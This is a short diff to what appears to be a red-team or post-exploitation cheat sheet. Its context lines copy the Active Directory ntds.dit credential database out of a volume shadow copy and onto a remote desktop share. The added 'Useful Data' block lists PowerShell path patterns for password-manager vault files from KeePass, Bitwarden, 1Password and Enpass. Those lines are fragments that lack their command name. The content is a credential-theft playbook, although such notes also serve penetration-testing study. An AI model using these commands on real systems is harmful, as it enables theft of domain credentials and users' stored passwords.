@@ -349,3 +349,13 @@ vshadow.exe -p -nw C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
 cp .\ntds.dit.bak \\tsclient\shared
 ```
+
+Useful Data
+---
+```poweshell
+"$env:USERPROFILE\Documents\*.kdbx" -ErrorAction SilentlyContinue
+"$env:APPDATA\Bitwarden\data.json" -ErrorAction SilentlyContinue
+"$env:USERPROFILE\*.opvault" -ErrorAction SilentlyContinue
+"$env:USERPROFILE\*.1pux" -ErrorAction SilentlyContinue
+"$env:APPDATA\Sinew Software Systems Pvt Ltd\Enpass\Enpass\Vaults\*.enpassdb" -ErrorAction SilentlyContinue
+```
